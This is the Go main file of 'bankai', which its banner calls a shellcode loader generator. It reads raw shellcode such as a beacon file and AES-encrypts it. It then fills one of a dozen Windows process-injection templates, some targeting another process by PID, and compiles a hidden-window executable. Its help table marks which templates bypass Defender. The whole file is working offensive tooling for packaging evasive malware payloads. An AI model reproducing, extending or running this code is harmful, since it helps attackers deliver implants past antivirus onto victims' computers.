package main

import (
	"flag"
	"fmt"
	"io"
	math "math/rand"
	"os"
	"os/exec"
	"time"

	"./crypter"
	"./process"
	"./readfile"
)

const (
	usage = `
    Required:
    -i            Binary File (e.g., beacon.bin)
    -o            Payload Output (e.g, payload.exe)
    -t            Payload Template (e.g., win32_VirtualProtect.tmpl)
    -a            Arch (32|64)

    Optional:
    -h            Print this help menu
    -p            PID

    Templates:                                        Last update: 06/07/21
    +--------------------------------------+-----------+------------------+
    | Techniques                           | PID       | Bypass Defender  |
    +--------------------------------------+-----------+------------------+
    | win32_VirtualProtect.tmpl            |           |        No        |
    +--------------------------------------+-----------+------------------+
    | win64_CreateFiber.tmpl               |           |        No        |
    +--------------------------------------+-----------+------------------+
    | win64_CreateRemoteThreadNative.tmpl  | Required  |        Yes       |
    +--------------------------------------+-----------+------------------+
    | win64_CreateThread.tmpl              |           |        No        |
    +--------------------------------------+-----------+------------------+
    | win64_EtwpCreateEtwThread.tmpl       |           |        No        |
    +--------------------------------------+-----------+------------------+
    | win64_Syscall.tmpl                   |           |        No        |
    +--------------------------------------+-----------+------------------+
    | win64_CreateThreadpoolWait.tmpl      |           |        No        |
    +--------------------------------------+-----------+------------------+
    | win64_EnumerateLoadedModules.tmpl    |           |        No        |
    +--------------------------------------+-----------+------------------+
    | win64_EnumChildWindows.tmpl          |           |        No        |
    +--------------------------------------+-----------+------------------+
    | win64_CreateRemoteThread.tmpl        | Required  |        No        |
    +--------------------------------------+-----------+------------------+
    | win64_RtlCreateUserThread.tmpl       | Required  |        No        |
    +--------------------------------------+-----------+------------------+
    | win64_CreateThreadNative.tmpl        |           |        No        |
    +--------------------------------------+-----------+------------------+

    Example:

    ./bankai -i beacon.bin -o payload.exe -t win64_CreateThread.tmpl -a 64
   `
)

func banner() {
	banner := `
     _                 _         _
    | |               | |       (_)
    | |__   __ _ _ __ | | ____ _ _
    | '_ \ / _' | '_ \| |/ / _' | |
    | |_) | (_| | | | |   < (_| | |
    |_.__/ \__,_|_| |_|_|\_\__,_|_|
                        [bigb0ss]

    [INFO] Another Go Shellcode Loader
`
	fmt.Println(banner)
}

type menu struct {
	help      bool
	input     string
	output    string
	templates string
	arch      string
	pid       int
}

func options() *menu {
	input := flag.String("i", "", "raw payload")
	output := flag.String("o", "", "payload output")
	templates := flag.String("t", "", "payload template")
	arch := flag.String("a", "", "arch")
	pid := flag.Int("p", 0, "pid")
	help := flag.Bool("h", false, "Help Menu")

	flag.Parse()

	return &menu{
		help:      *help,
		input:     *input,
		output:    *output,
		templates: *templates,
		arch:      *arch,
		pid:       *pid,
	}
}

func main() {

	opt := options()
	if opt.help {
		banner()
		fmt.Println(usage)
		os.Exit(0)
	}

	if opt.input == "" || opt.output == "" || opt.templates == "" || opt.arch == "" {
		fmt.Println(usage)
		os.Exit(0)
	}

	// if opt.templates == "win64_CreateRemoteThreadNative.tmpl" || opt.templates == "win64_CreateRemoteThread.tmpl" || opt.templates == "win64_RtlCreateUserThread.tmpl" && opt.pid == 0 {
	// 	fmt.Println("[ERROR] For this template, you must use PID (-p).")
	// 	os.Exit(1)
	// }

	// Bug Fix (10-24-21) - Credit: @Simon-Davies
	if opt.templates == "win64_CreateRemoteThreadNative.tmpl" && opt.pid == 0 || opt.templates == "win64_CreateRemoteThread.tmpl" && opt.pid == 0 || opt.templates == "win64_RtlCreateUserThread.tmpl" && opt.pid == 0 {
		fmt.Println("[ERROR] For this template, you must use PID (-p).")
		os.Exit(1)
	}

	inputFile := opt.input
	outputFile := opt.output
	tmplSelect := opt.templates
	arch := opt.arch
	pid := opt.pid

	// Reading shellcode from .bin
	shellcodeFromFile := readfile.ReadShellcode(inputFile)

	// Getting AES key
	math.Seed(time.Now().UnixNano())
	key := []byte(crypter.RandKeyGen(32)) //Key Size: 16, 32
	fmt.Printf("[INFO] Key: %v\n", string(key))

	// Payload encryption
	encryptedPayload := crypter.Encrypt(key, []byte(shellcodeFromFile))
	fmt.Println("[INFO] AES encrpyting the payload...")

	// Creating an output file with entered shellcode
	file, err := os.Create("output/shellcode.go")
	if err != nil {
		fmt.Printf("[ERROR] %s\n", err)
	}
	defer file.Close()

	// Template creation with shellcode
	vars := make(map[string]interface{})
	vars["Shellcode"] = encryptedPayload
	vars["Key"] = string(key)
	vars["Pid"] = pid
	r := process.ProcessFile("templates/"+tmplSelect, vars)

	_, err = io.WriteString(file, r)
	if err != nil {
		fmt.Println("[ERROR] Failed to create template")
		os.Exit(1)
	}

	// Compling the output shellcode loader
	cmd := exec.Command(
		"go",
		"build",
		"-ldflags=-s",            // Using -s instructs Go to create the smallest output
		"-ldflags=-w",            // Using -w instructs Go to create the smallest output
		"-ldflags=-H=windowsgui", // hide console window - (10-24-21) Credit: @Simon-Davies
		"-o", outputFile,
		"output/shellcode.go",
	)

	archTech := ""
	if arch == "32" {
		archTech = "386"
		fmt.Println("[INFO] Arch: x86 (32-bit)")
	} else if arch == "64" {
		archTech = "amd64"
		fmt.Println("[INFO] Arch: x64 (64-bit)")
	} else {
		fmt.Println("[ERROR] Arch must be 32 or 64")
		os.Exit(1)
	}

	cmd.Env = append(os.Environ(),
		"GOOS=windows",
		"GOARCH="+archTech,
	)

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	errCmd := cmd.Run()
	if errCmd != nil {
		fmt.Println("[ERROR] Failed to compile the payload.")
		os.Exit(1)
	}

	fmt.Printf("[INFO] Template: %s\n", tmplSelect)
	fmt.Printf("[INFO] InputFile: %s\n", inputFile)
	fmt.Printf("[INFO] OutputFile: %s\n", outputFile)

}
